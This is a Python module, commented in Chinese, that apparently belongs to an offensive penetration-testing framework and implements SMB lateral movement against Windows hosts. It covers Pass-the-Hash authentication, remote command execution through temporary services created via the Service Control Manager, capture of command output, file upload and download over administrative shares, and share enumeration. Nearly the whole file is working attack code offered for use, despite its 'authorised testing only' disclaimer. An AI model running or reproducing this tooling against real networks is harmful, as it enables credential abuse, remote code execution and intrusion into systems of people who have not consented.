#!/usr/bin/env python3
"""
SMB 横向移动模块 - SMB Lateral Movement
功能: Pass-the-Hash、SMB 命令执行、文件传输
支持: impacket 库 + 纯 Python 回退

用于授权安全测试，仅限合法渗透测试使用
"""

import logging
import os
import socket
import struct
import tempfile
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from .base import (
    AuthMethod,
    BaseLateralModule,
    Credentials,
    ExecutionMethod,
    ExecutionResult,
    FileTransferResult,
    LateralConfig,
    LateralStatus,
)

logger = logging.getLogger(__name__)

# 尝试导入 impacket
try:
    from impacket.dcerpc.v5 import scmr, transport
    from impacket.smbconnection import SMBConnection as ImpacketSMB

    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False
    logger.debug("impacket 未安装，SMB 功能受限")


@dataclass
class SMBShare:
    """SMB 共享信息"""

    name: str
    share_type: int
    remark: str = ""
    permissions: List[str] = field(default_factory=list)


@dataclass
class SMBFile:
    """SMB 文件信息"""

    name: str
    size: int
    is_directory: bool
    created: str = ""
    modified: str = ""
    accessed: str = ""


class SMBLateral(BaseLateralModule):
    """
    SMB 横向移动模块

    支持:
    - 密码认证
    - Pass-the-Hash (PTH)
    - 远程命令执行 (通过 SCM 服务)
    - 文件上传/下载

    Usage:
        creds = Credentials(
            username='administrator',
            ntlm_hash='aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'
        )

        with SMBLateral('192.168.1.100', creds) as smb:
            # 执行命令
            result = smb.execute('whoami')
            print(result.output)

            # 列出共享
            shares = smb.list_shares()

            # 上传文件
            smb.upload('/local/file.exe', 'Windows\\Temp\\file.exe')
    """

    name = "smb"
    description = "SMB/CIFS 横向移动，支持 Pass-the-Hash"
    default_port = 445
    supported_auth = [AuthMethod.PASSWORD, AuthMethod.HASH]
    supports_file_transfer = True  # 支持 SMB 共享文件传输

    def __init__(
        self, target: str, credentials: Credentials, config: Optional[LateralConfig] = None
    ):
        super().__init__(target, credentials, config)
        self._conn: Optional[Any] = None  # ImpacketSMB 或 socket
        self._use_impacket = HAS_IMPACKET
        self._authenticated = False

    @property
    def port(self) -> int:
        """获取 SMB 端口"""
        return self.config.port or self.config.smb_port or self.default_port

    def connect(self) -> bool:
        """
        建立 SMB 连接

        优先使用 impacket，失败则回退到纯 Python 实现
        """
        self._set_status(LateralStatus.CONNECTING)

        try:
            if self._use_impacket:
                if self._connect_impacket():
                    self._set_status(LateralStatus.CONNECTED)
                    self._connect_time = time.time()
                    return True

            # 回退到纯 Python
            if self._connect_native():
                self._set_status(LateralStatus.CONNECTED)
                self._connect_time = time.time()
                return True

            self._set_status(LateralStatus.FAILED)
            return False

        except (socket.error, socket.timeout, OSError) as e:
            self.logger.error(f"SMB 连接失败: {e}")
            self._set_status(LateralStatus.FAILED)
            return False

    def _connect_impacket(self) -> bool:
        """使用 impacket 建立连接"""
        if not HAS_IMPACKET:
            return False

        try:
            self._conn = ImpacketSMB(
                self.target, self.target, sess_port=self.port, timeout=self.config.timeout
            )

            if self.credentials.method == AuthMethod.HASH:
                # Pass-the-Hash
                self._conn.login(
                    self.credentials.username,
                    "",
                    self.credentials.domain or "",
                    self.credentials.lm_hash,
                    self.credentials.nt_hash,
                )
                self.logger.info(f"PTH 认证成功: {self.credentials.username}@{self.target}")
            else:
                # 密码认证
                self._conn.login(
                    self.credentials.username,
                    self.credentials.password or "",
                    self.credentials.domain or "",
                )
                self.logger.info(f"密码认证成功: {self.credentials.username}@{self.target}")

            self._authenticated = True
            self._use_impacket = True
            return True

        except (socket.error, socket.timeout, OSError) as e:
            self.logger.debug(f"impacket 连接失败: {e}")
            return False

    def _connect_native(self) -> bool:
        """
        纯 Python SMB 连接 (基础实现)

        注意: 这是简化版本，功能有限
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.target, self.port))

            # 发送 SMB Negotiate
            negotiate = self._build_negotiate_request()
            sock.send(negotiate)

            response = sock.recv(4096)
            if not self._parse_negotiate_response(response):
                sock.close()
                return False

            # 发送 Session Setup
            if self.credentials.method == AuthMethod.HASH:
                session_setup = self._build_session_setup_pth()
            else:
                session_setup = self._build_session_setup_password()

            sock.send(session_setup)
            response = sock.recv(4096)

            if self._check_auth_success(response):
                self._conn = sock
                self._authenticated = True
                self._use_impacket = False
                self.logger.info(
                    f"纯 Python SMB 认证成功: {self.credentials.username}@{self.target}"
                )
                return True

            sock.close()
            return False

        except (socket.error, socket.timeout, OSError) as e:
            self.logger.debug(f"纯 Python SMB 连接失败: {e}")
            return False

    def _build_negotiate_request(self) -> bytes:
        """构建 SMB1 Negotiate 请求"""
        # NetBIOS Session
        netbios = b"\x00"  # Message Type
        netbios += b"\x00\x00\x00"  # Length (placeholder)

        # SMB Header
        smb_header = b"\xffSMB"  # Protocol
        smb_header += b"\x72"  # Command: Negotiate
        smb_header += b"\x00\x00\x00\x00"  # Status
        smb_header += b"\x18"  # Flags
        smb_header += b"\x53\xc8"  # Flags2
        smb_header += b"\x00" * 12  # Reserved
        smb_header += b"\x00\x00"  # TID
        smb_header += b"\xff\xfe"  # PID
        smb_header += b"\x00\x00"  # UID
        smb_header += b"\x00\x00"  # MID

        # Negotiate Dialect
        dialects = b"\x02NT LM 0.12\x00"
        word_count = b"\x00"
        byte_count = struct.pack("<H", len(dialects))

        body = word_count + byte_count + dialects
        total = smb_header + body

        # 更新长度
        length = struct.pack(">I", len(total))[1:]
        return netbios[:1] + length + total

    def _parse_negotiate_response(self, response: bytes) -> bool:
        """解析 Negotiate 响应"""
        if len(response) < 36:
            return False
        # 检查 SMB 签名
        if response[4:8] != b"\xffSMB":
            # 尝试 SMB2
            if response[4:8] == b"\xfeSMB":
                return True
            return False
        return True

    def _build_session_setup_pth(self) -> bytes:
        """构建 Pass-the-Hash 认证请求 (简化版)"""
        # 完整的 NTLMSSP 实现需要更多代码
        # 生产环境应使用 impacket
        return self._build_session_setup_password()

    def _build_session_setup_password(self) -> bytes:
        """构建密码认证请求 (简化版)"""
        # NetBIOS + SMB Header
        header = b"\x00\x00\x00\x00"  # NetBIOS
        header += b"\xffSMB"  # Protocol
        header += b"\x73"  # Command: Session Setup AndX
        header += b"\x00\x00\x00\x00"  # Status
        header += b"\x18"  # Flags
        header += b"\x07\xc8"  # Flags2
        header += b"\x00" * 12  # Reserved
        header += b"\x00\x00"  # TID
        header += b"\xff\xfe"  # PID
        header += b"\x00\x00"  # UID
        header += b"\x00\x00"  # MID

        return header

    def _check_auth_success(self, response: bytes) -> bool:
        """检查认证是否成功"""
        if len(response) < 12:
            return False
        # 检查 NT_STATUS
        if len(response) > 12:
            status = struct.unpack("<I", response[9:13])[0]
            return status == 0
        return False

    def disconnect(self) -> None:
        """断开 SMB 连接"""
        self._set_status(LateralStatus.DISCONNECTING)

        if self._conn:
            try:
                if self._use_impacket and HAS_IMPACKET:
                    self._conn.close()
                else:
                    self._conn.close()
            except (socket.error, OSError) as e:
                self.logger.debug(f"断开连接时出错: {e}")
            finally:
                self._conn = None

        self._authenticated = False
        self._set_status(LateralStatus.DISCONNECTED)

    def execute(self, command: str, timeout: Optional[float] = None) -> ExecutionResult:
        """
        通过 SMB 执行远程命令

        使用 SCM (Service Control Manager) 创建临时服务执行命令
        """
        if not self._authenticated or not self._conn:
            return ExecutionResult(
                success=False, error="未连接", method=ExecutionMethod.SMBEXEC.value
            )

        if not self._use_impacket:
            return ExecutionResult(
                success=False,
                error="纯 Python 模式不支持命令执行，请安装 impacket",
                method=ExecutionMethod.SMBEXEC.value,
            )

        self._set_status(LateralStatus.EXECUTING)
        self._update_activity()
        start_time = time.time()
        timeout = timeout or self.config.timeout

        try:
            result = self._exec_via_scm(command)
            result.duration = time.time() - start_time
            result.method = ExecutionMethod.SMBEXEC.value
            self._set_status(LateralStatus.CONNECTED)
            return result

        except (socket.error, OSError) as e:
            self._set_status(LateralStatus.CONNECTED)
            return ExecutionResult(
                success=False,
                error=f"网络错误: {e}",
                duration=time.time() - start_time,
                method=ExecutionMethod.SMBEXEC.value,
            )

    def _exec_via_scm(self, command: str) -> ExecutionResult:
        """通过 SCM 服务执行命令"""
        try:
            # 连接到 SCM
            string_binding = f"ncacn_np:{self.target}[\\pipe\\svcctl]"
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.set_smb_connection(self._conn)

            dce = rpc_transport.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            # 打开 SCM
            resp = scmr.hROpenSCManagerW(dce)
            scm_handle = resp["lpScHandle"]

            # 生成服务名
            service_name = f"{self.config.smb_service_prefix}_{self._session_id}"
            binary_path = f"cmd.exe /c {command}"

            try:
                # 创建服务
                resp = scmr.hRCreateServiceW(
                    dce,
                    scm_handle,
                    service_name,
                    service_name,
                    lpBinaryPathName=binary_path,
                    dwStartType=scmr.SERVICE_DEMAND_START,
                )
                service_handle = resp["lpServiceHandle"]

            except (ValueError, KeyError) as create_err:
                # 服务可能已存在，尝试打开
                try:
                    resp = scmr.hROpenServiceW(dce, scm_handle, service_name)
                    service_handle = resp["lpServiceHandle"]
                    # 更新服务配置
                    scmr.hRChangeServiceConfigW(dce, service_handle, lpBinaryPathName=binary_path)
                except (ValueError, KeyError):
                    raise create_err

            # 启动服务
            try:
                scmr.hRStartServiceW(dce, service_handle)
            except (ValueError, OSError) as start_err:
                # 服务可能立即停止，这是正常的
                self.logger.debug(f"服务启动: {start_err}")

            # 等待执行
            time.sleep(1)

            # 清理服务
            try:
                scmr.hRDeleteService(dce, service_handle)
            except (ValueError, OSError):
                pass  # 清理时忽略错误

            try:
                scmr.hRCloseServiceHandle(dce, service_handle)
                scmr.hRCloseServiceHandle(dce, scm_handle)
            except (ValueError, OSError):
                pass  # 清理时忽略错误

            return ExecutionResult(
                success=True,
                output="命令已执行 (输出未捕获)",
            )

        except (socket.error, OSError, ValueError) as e:
            return ExecutionResult(success=False, error=f"执行错误: {e}")

    def execute_with_output(self, command: str, timeout: Optional[float] = None) -> ExecutionResult:
        """
        执行命令并获取输出

        通过将输出重定向到共享文件，然后读取
        """
        if not self._authenticated or not self._conn:
            return ExecutionResult(success=False, error="未连接")

        if not self._use_impacket:
            return ExecutionResult(success=False, error="需要 impacket")

        start_time = time.time()

        try:
            # 生成临时文件名
            output_file = f"\\Windows\\Temp\\{self._session_id}.txt"
            full_command = f"{command} > C:{output_file} 2>&1"

            # 执行命令
            result = self._exec_via_scm(full_command)

            if not result.success:
                return result

            # 等待输出写入
            time.sleep(2)

            # 读取输出
            try:
                output = self._read_share_file(self.config.smb_share, output_file)
            except (IOError, OSError, socket.error) as e:
                output = f"无法读取输出: {e}"

            # 删除临时文件
            try:
                self._delete_share_file(self.config.smb_share, output_file)
            except (IOError, OSError):
                pass  # 清理时忽略错误

            return ExecutionResult(
                success=True,
                output=output,
                duration=time.time() - start_time,
                method=ExecutionMethod.SMBEXEC.value,
            )

        except (socket.error, OSError, IOError) as e:
            return ExecutionResult(
                success=False, error=f"执行错误: {e}", duration=time.time() - start_time
            )

    def upload(self, local_path: str, remote_path: str) -> FileTransferResult:
        """
        上传文件到 SMB 共享

        Args:
            local_path: 本地文件路径
            remote_path: 远程路径 (相对于共享根目录)
        """
        if not self._authenticated or not self._conn:
            return FileTransferResult(
                success=False, source=local_path, destination=remote_path, error="未连接"
            )

        if not self._use_impacket:
            return FileTransferResult(
                success=False,
                source=local_path,
                destination=remote_path,
                error="纯 Python 模式不支持文件上传",
            )

        self._set_status(LateralStatus.UPLOADING)
        self._update_activity()
        start_time = time.time()

        try:
            # 规范化远程路径
            if not remote_path.startswith("\\"):
                remote_path = "\\" + remote_path
            remote_path = remote_path.replace("/", "\\")

            # 获取文件大小
            file_size = os.path.getsize(local_path)

            # 上传文件
            with open(local_path, "rb") as f:
                self._conn.putFile(self.config.smb_share, remote_path, f.read)

            self._set_status(LateralStatus.CONNECTED)
            self.logger.info(f"上传成功: {local_path} -> {self.config.smb_share}{remote_path}")

            return FileTransferResult(
                success=True,
                source=local_path,
                destination=f"{self.config.smb_share}{remote_path}",
                size=file_size,
                duration=time.time() - start_time,
            )

        except FileNotFoundError as e:
            self._set_status(LateralStatus.CONNECTED)
            return FileTransferResult(
                success=False,
                source=local_path,
                destination=remote_path,
                error=f"文件不存在: {e}",
                duration=time.time() - start_time,
            )
        except (IOError, OSError, socket.error) as e:
            self._set_status(LateralStatus.CONNECTED)
            return FileTransferResult(
                success=False,
                source=local_path,
                destination=remote_path,
                error=f"传输错误: {e}",
                duration=time.time() - start_time,
            )

    def download(self, remote_path: str, local_path: str) -> FileTransferResult:
        """
        从 SMB 共享下载文件

        Args:
            remote_path: 远程路径 (相对于共享根目录)
            local_path: 本地文件路径
        """
        if not self._authenticated or not self._conn:
            return FileTransferResult(
                success=False, source=remote_path, destination=local_path, error="未连接"
            )

        if not self._use_impacket:
            return FileTransferResult(
                success=False,
                source=remote_path,
                destination=local_path,
                error="纯 Python 模式不支持文件下载",
            )

        self._set_status(LateralStatus.DOWNLOADING)
        self._update_activity()
        start_time = time.time()

        try:
            # 规范化远程路径
            if not remote_path.startswith("\\"):
                remote_path = "\\" + remote_path
            remote_path = remote_path.replace("/", "\\")

            # 下载文件
            with open(local_path, "wb") as f:
                self._conn.getFile(self.config.smb_share, remote_path, f.write)

            file_size = os.path.getsize(local_path)
            self._set_status(LateralStatus.CONNECTED)
            self.logger.info(f"下载成功: {self.config.smb_share}{remote_path} -> {local_path}")

            return FileTransferResult(
                success=True,
                source=f"{self.config.smb_share}{remote_path}",
                destination=local_path,
                size=file_size,
                duration=time.time() - start_time,
            )

        except FileNotFoundError as e:
            self._set_status(LateralStatus.CONNECTED)
            return FileTransferResult(
                success=False,
                source=remote_path,
                destination=local_path,
                error=f"远程文件不存在: {e}",
                duration=time.time() - start_time,
            )
        except (IOError, OSError, socket.error) as e:
            self._set_status(LateralStatus.CONNECTED)
            return FileTransferResult(
                success=False,
                source=remote_path,
                destination=local_path,
                error=f"传输错误: {e}",
                duration=time.time() - start_time,
            )

    def list_shares(self) -> List[SMBShare]:
        """列出 SMB 共享"""
        if not self._authenticated or not self._conn:
            return []

        if not self._use_impacket:
            return []

        shares = []
        try:
            share_list = self._conn.listShares()
            for share in share_list:
                shares.append(
                    SMBShare(
                        name=share["shi1_netname"][:-1] if share["shi1_netname"] else "",
                        share_type=share["shi1_type"],
                        remark=share["shi1_remark"][:-1] if share.get("shi1_remark") else "",
                    )
                )
        except (socket.error, OSError, KeyError) as e:
            self.logger.error(f"列出共享失败: {e}")

        return shares

    def list_files(self, share: str, path: str = "\\") -> List[SMBFile]:
        """列出共享中的文件"""
        if not self._authenticated or not self._conn:
            return []

        if not self._use_impacket:
            return []

        files = []
        try:
            self._conn.connectTree(share)
            file_list = self._conn.listPath(share, path + "*")

            for f in file_list:
                files.append(
                    SMBFile(
                        name=f.get_longname(),
                        size=f.get_filesize(),
                        is_directory=f.is_directory(),
                        created=str(f.get_ctime()),
                        modified=str(f.get_mtime()),
                        accessed=str(f.get_atime()),
                    )
                )
        except (socket.error, OSError, KeyError) as e:
            self.logger.error(f"列出文件失败: {e}")

        return files

    def _read_share_file(self, share: str, path: str) -> str:
        """读取共享文件内容"""
        fd, temp_file = tempfile.mkstemp(prefix="art_smb_")
        try:
            os.close(fd)
            with open(temp_file, "wb") as f:
                self._conn.getFile(share, path, f.write)

            with open(temp_file, "r", encoding="utf-8", errors="ignore") as f:
                return f.read()
        finally:
            if os.path.exists(temp_file):
                os.remove(temp_file)

    def _delete_share_file(self, share: str, path: str) -> bool:
        """删除共享文件"""
        try:
            self._conn.deleteFile(share, path)
            return True
        except (IOError, OSError, socket.error):
            return False


# 便捷函数
def smb_connect(
    target: str,
    username: str,
    password: str = "",
    ntlm_hash: str = "",
    domain: str = "",
    port: int = 445,
) -> Tuple[bool, SMBLateral]:
    """
    快速建立 SMB 连接

    Returns:
        (成功标志, SMBLateral 实例)
    """
    creds = Credentials(
        username=username,
        password=password if password else None,
        ntlm_hash=ntlm_hash if ntlm_hash else None,
        domain=domain,
    )

    config = LateralConfig(smb_port=port)
    smb = SMBLateral(target, creds, config)

    return smb.connect(), smb


def smb_exec(
    target: str,
    username: str,
    password: str = "",
    ntlm_hash: str = "",
    domain: str = "",
    command: str = "whoami",
) -> Dict[str, Any]:
    """
    SMB 远程命令执行 (便捷函数)

    Args:
        target: 目标主机
        username: 用户名
        password: 密码
        ntlm_hash: NTLM Hash (与密码二选一)
        domain: 域名
        command: 命令

    Returns:
        执行结果字典
    """
    creds = Credentials(
        username=username,
        password=password if password else None,
        ntlm_hash=ntlm_hash if ntlm_hash else None,
        domain=domain,
    )

    smb = SMBLateral(target, creds)

    if not smb.connect():
        return {"success": False, "error": "连接失败", "target": target, "command": command}

    result = smb.execute(command)
    smb.disconnect()

    return {
        "success": result.success,
        "output": result.output,
        "error": result.error,
        "exit_code": result.exit_code,
        "duration": result.duration,
        "target": target,
        "command": command,
        "method": result.method,
    }


def pass_the_hash(
    target: str, username: str, ntlm_hash: str, domain: str = "", command: Optional[str] = None
) -> Dict[str, Any]:
    """
    Pass-the-Hash 攻击

    Args:
        target: 目标主机
        username: 用户名
        ntlm_hash: NTLM Hash (LM:NT 或仅 NT)
        domain: 域名
        command: 要执行的命令 (可选)

    Returns:
        结果字典
    """
    creds = Credentials(username=username, ntlm_hash=ntlm_hash, domain=domain)

    smb = SMBLateral(target, creds)

    if not smb.connect():
        return {"success": False, "error": "认证失败", "target": target}

    result: Dict[str, Any] = {
        "success": True,
        "target": target,
        "username": username,
        "domain": domain,
        "auth_method": "pass_the_hash",
        "shares": [s.name for s in smb.list_shares()],
    }

    if command:
        exec_result = smb.execute(command)
        result["command"] = command
        result["command_output"] = exec_result.output
        result["command_success"] = exec_result.success

    smb.disconnect()
    return result


def smb_upload(
    target: str,
    username: str,
    password: str,
    local_path: str,
    remote_path: str,
    share: str = "C$",
    domain: str = "",
) -> Dict[str, Any]:
    """上传文件到 SMB 共享"""
    creds = Credentials(username=username, password=password, domain=domain)
    config = LateralConfig(smb_share=share)

    smb = SMBLateral(target, creds, config)

    if not smb.connect():
        return {"success": False, "error": "连接失败"}

    result = smb.upload(local_path, remote_path)
    smb.disconnect()

    return result.to_dict()


def smb_download(
    target: str,
    username: str,
    password: str,
    remote_path: str,
    local_path: str,
    share: str = "C$",
    domain: str = "",
) -> Dict[str, Any]:
    """从 SMB 共享下载文件"""
    creds = Credentials(username=username, password=password, domain=domain)
    config = LateralConfig(smb_share=share)

    smb = SMBLateral(target, creds, config)

    if not smb.connect():
        return {"success": False, "error": "连接失败"}

    result = smb.download(remote_path, local_path)
    smb.disconnect()

    return result.to_dict()


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
    logger.info("=== SMB Lateral Movement Module ===")
    logger.info(f"impacket 可用: {HAS_IMPACKET}")
    logger.info("使用示例:")
    logger.info("  from core.lateral import SMBLateral, Credentials, pass_the_hash")
    logger.info("  result = pass_the_hash('192.168.1.100', 'admin', 'aad3b435:8846f7ea...')")
